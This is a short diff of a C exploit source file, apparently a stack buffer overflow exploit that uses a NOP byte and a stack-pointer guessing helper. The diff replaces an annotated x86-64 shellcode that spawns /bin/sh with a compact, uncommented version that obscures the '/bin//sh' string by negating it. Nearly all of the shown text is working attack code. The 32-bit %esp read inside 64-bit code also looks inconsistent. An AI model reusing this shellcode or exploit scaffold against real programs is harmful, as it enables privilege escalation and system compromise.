@@ -32,18 +32,7 @@
 #define DEFAULT_BUFFER_SIZE             512
 #define NOP                            0x90
 
-const char shellcode[] =
-        "\x48\x31\xc0"                               // xor    %rax,%rax
-        "\x99"                                       // cltd
-        "\xb0\x3b"                                   // mov    $0x3b,%al
-        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
-        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
-        "\x57"                                       // push   %rdi
-        "\x48\x89\xe7"                               // mov    %rsp,%rdi
-        "\x57"                                       // push   %rdi
-        "\x52"                                       // push   %rdx
-        "\x48\x89\xe6"                               // mov    %rsp,%rsi
-        "\x0f\x05";                                  // syscall
+const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
 unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
